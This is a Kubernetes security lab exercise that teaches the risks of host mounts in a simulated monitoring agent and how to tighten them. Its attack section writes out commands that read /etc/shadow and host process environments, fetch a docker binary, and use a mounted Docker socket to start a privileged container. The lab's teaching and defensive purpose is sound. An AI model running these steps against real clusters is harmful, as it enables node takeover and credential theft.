### Introduction
In this exercise, we cover:

 - The risk of host mounts
 - How to use read-only mounts if they suffice

### Setup
In this example, we'll just directly use a shell inside the app.
Our example app will be a simulated monitoring agent mounting the same paths as the [Datadog DaemonSet](https://docs.datadoghq.com/agent/kubernetes/daemonset_setup/?tab=k8sfile):
```
volumeMounts:
  - {name: dockersocket, mountPath: /var/run/docker.sock}
  - {name: procdir, mountPath: /host/proc, readOnly: true}
  - {name: cgroups, mountPath: /host/sys/fs/cgroup, readOnly: true}
  - {name: s6-run, mountPath: /var/run/s6}
  - {name: logpodpath, mountPath: /var/log/pods}
  ## Docker runtime directory, replace this path with your container runtime
  ## logs directory, or remove this configuration if `/var/log/pods`
  ## is not a symlink to any other directory.
  - {name: logcontainerpath, mountPath: /var/lib/docker/containers}
```

We'll also mount `/etc` itself for extra fun.

Let's deploy our simulated agent:

```
kubectl apply -f https://securek8s.dev/agent/base.yaml
```

<!-- TODO: note that you read env vars with this mount, even if read-only. Also, the Docker socketâ€”scream! -->

### Attack
With our power to execute commands, we'll see what types of files we
could modify, and what sorts of access they could provide.

Find a pod:
```
kubectl get po -n mounts
```

Then get into it:
```bash
kubectl exec -it -n mounts "$(kubectl get po -n mounts --output=jsonpath='{.items[0].metadata.name}')" -- bash
```

Now, try some host modifications and information gathering attempts:

```
touch /host/etc/flag
cat /host/etc/shadow
ls /host/proc/
cat /host/proc/*/cmdline
cat /host/proc/1/cmdline
ls -alh /host/proc/1/environ
```

Note that our host info is different from our container's:

```
cat /proc/1/cmdline
```

What else can you come up with?

Note that this deployment is extra-dangerous because it mounts the Docker socket.
That's a great way for your container to have effectively root privileges on the node.

First, let's install `curl` to download some more tools:

```
apt-get update
apt-get install -y curl
```

Next, let's install Docker and show the running containers on the host:

```bash
curl https://download.docker.com/linux/static/stable/x86_64/docker-19.03.6.tgz | tar xzv
./docker/docker ps
```

And let's use our access to launch a privileged container (more on this in [a later exercise](../65-privileged)):
```
./docker/docker run --rm -it --privileged ubuntu
```

This container has elevated access to the host.
You can do whatever you like, though your container still has its own file system and process namespaces, so it's not _precisely_ like being on the host.
We'll cover more about privileged containers in [a later exercise](../65-privileged).

Hit `ctrl-D` to exit once you've finished poking around.

Now you're back in the pod.

Let's use some of the other mounts in our simulated agent.
For instance, we could spy on other containers' logs:
```
ls /var/log/pods
```

Pick a pod you're interested in, then see what you can learn from the logs:

```
ls /var/log/pods/<your-pod-name>
... continue checking things out ...
```

Hit `Ctrl-D` to exit the pod.

### Countermeasure
We can:

 - Remove some mount paths our application doesn't need,
 - Mark some of our mounts read-only, and
 - Mount more specific paths,

depending on the access we actually need.

This can require a bit of application knowledge, so is often best done with the team that maintains or operates the app.

Let's see what our improved deployment changes (a few mounts removed, and one marked read-only):

```
kubectl diff -f https://securek8s.dev/agent/improved.yaml
```

Then let's deploy it:

```
kubectl apply -f https://securek8s.dev/agent/improved.yaml
```

Make sure the old pod has been deleted, and the new one is marked `Running`:
```
kubectl get po -n mounts
```

Then get into it:
```bash
kubectl exec -it -n mounts "$(kubectl get po -n mounts --output=jsonpath='{.items[0].metadata.name}')" -- bash
```

### Attack effects after patching
You can't mess with stuff if you can't write to it, or
find out information you can't read!

Note that the Docker socket [still **does** work](https://news.ycombinator.com/item?id=17983623) despite us mounting it read-only:

Install `curl`:

```
apt-get update
apt-get install -y curl
```

Download and use `docker`:

```bash
curl https://download.docker.com/linux/static/stable/x86_64/docker-19.03.6.tgz | tar xzv
./docker/docker ps
./docker/docker run --rm -it --privileged ubuntu
```

If we try some of the same manipulations we tried earlier, they'll fail.

Hit `Ctrl-D` to exit the pod when you're done.

### How to use it yourself
If you use an application that needs to know something about the host,
you might need to mount a host path.

You can minimize the risk that such mounts poses by:

 - marking them read-only, and
 - minimizing the mount surface to just what's required.

Note, when you're slimming down mounts: container runtimes will sometimes _create_ files on your host
if they do not exist, which can be a problem if you want to mount
a path that might not exist.
This is particularly annoying when you try to mount a specific file
and the runtime creates a directory.

### Next up
We'll pivot to network policies in the next exercise:
